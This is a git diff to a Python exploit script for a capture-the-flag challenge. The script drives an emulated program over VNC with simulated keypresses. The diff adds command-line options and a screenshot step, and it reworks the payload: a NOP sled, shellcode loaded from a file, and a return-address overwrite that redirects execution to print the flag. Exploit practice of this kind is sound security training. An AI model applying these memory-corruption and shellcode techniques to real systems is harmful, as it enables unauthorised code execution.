@@ -1,6 +1,7 @@
 from vncdotool import api
 from binascii import unhexlify
 from subprocess import check_output
+import argparse
 import time
 
 """
@@ -31,10 +32,11 @@ def asm(s):
 
 
 class Client:
-    def __init__(self, display, password=None):
+    def __init__(self, display, password=None, delay=.1):
         self._vnc = api.connect(display, password=password)
         self.color = 0xc # what color our cursor is
         self.cursor_pos = (160, 100) # where our cursor is
+        self.delay = delay
 
     def press_key(self, key):
         """
@@ -43,7 +45,7 @@ class Client:
         """
         #print('[+] PRESSING: {}'.format(key))
         self._vnc.keyPress(key)
-        time.sleep(.1)
+        time.sleep(self.delay)
         # TODO: I'd love it if we did something more reliable than a sleep...
         # perhaps checking the display and seeing if it's changed
 
@@ -98,6 +100,9 @@ class Client:
         x, y = self.cursor_pos
         self.cursor_pos = x+1, y
 
+    def save_screenshot(self, filename):
+        self._vnc.captureScreen(filename)
+
     def __enter__(self):
         return self
     
@@ -114,7 +119,33 @@ def addr_to_coords(addr):
     return x, y
 
 
-with Client(':0') as client:
+def parse_args():                                                               
+    parser = argparse.ArgumentParser(
+        description='Solve challenge!',
+    )
+    parser.add_argument(
+        '--target',
+        type=str,
+        default=':0',
+        help='VNC server running pwnable', 
+    )
+    parser.add_argument(
+        '--password',
+        type=str,
+        default=None,
+        help='Password for vnc server',
+    )
+    parser.add_argument(
+        '--delay',
+        type=float,
+        default=.5,
+        help='How long to wait between keypresses? .1 works fine locally, .5 seems safe for remote',
+    )
+    return parser.parse_args()                                                  
+
+
+args = parse_args()
+with Client(args.target, args.password, delay=args.delay) as client:
     # select USA
     client.press_key('enter')
 
@@ -126,19 +157,12 @@ with Client(':0') as client:
     client.press_key('enter')
 
     # ok, here's the real exploit :)
-    # ugh r2 doesn't work... just used shc.s -> nasm
-    #shellcode = b'\x90' * 0x60 + asm(
-    #f"mov ax, 0x1300 ; "
-    #f"mov bx, 0x000f ; "
-    #f"mov cx, 0x{FLAG_LEN:x} ; "
-    #f"mov dx, 0x0712 ; "
-    #f"mov bp, 0x{FLAG_ADDR:x} ; "
-    #f"int 0x10") + b'\xeb\xfe'
-
     shellcode = b'\x90' * 0x60
     shellcode += open('shc', 'rb').read()
-    shellcode += b'\xebfe' * 4
-    shellcode += b'\x90' * 10 + b'\xeb\xbe' # nopsled into jmp $-0x40
+    # nopsled into jmp $-0x40.
+    # basically a safety net if we land after the main part of the shellcode,
+    # to ensure we still hit it
+    shellcode += b'\x90' * 10 + b'\xeb\xbe'
 
     print('Shellcode is', repr(shellcode))
     
@@ -181,20 +205,20 @@ with Client(':0') as client:
     # reasonable place where our arc goes to the right things...
     # kinda got this by eye, lol
     print('moving cursor to stack overwrite position...')
-    client.move_cursor(stack_x + 12, 10)
+    client.move_cursor(stack_x + 10, 10)
 
     print('Writing return addr of nopsled->shellcode...')
     # write return address of shellcode
-    for val in (0xffdd).to_bytes(4, 'big'):
-        print(f'writing ret: 0x{val:x}')
-        client.set_cursor_value(val)
-        
-        # TODO: these should be via the cheat menu!!
-        # enable trajectory, causes write
-        client.press_key('t')
-        # disable trajectory
-        client.press_key('t')
-
-        client.move_left()
+    # overwrites the high byte of ret->main on stack with ff, pointing near our
+    # shellcode (somewhere on either nopsled, hopefully!)
+    print('writing ret')
+    client.set_cursor_value(0xff)
+    # TODO: these should be via the cheat menu!!
+    # enable trajectory, causes write
+    client.press_key('t')
+    # disable trajectory
+    client.press_key('t')
 
     print('Ok, it should have jumped to the finish!')
+    print('Saving screenshot as flag.png')
+    client.save_screenshot('flag.png')
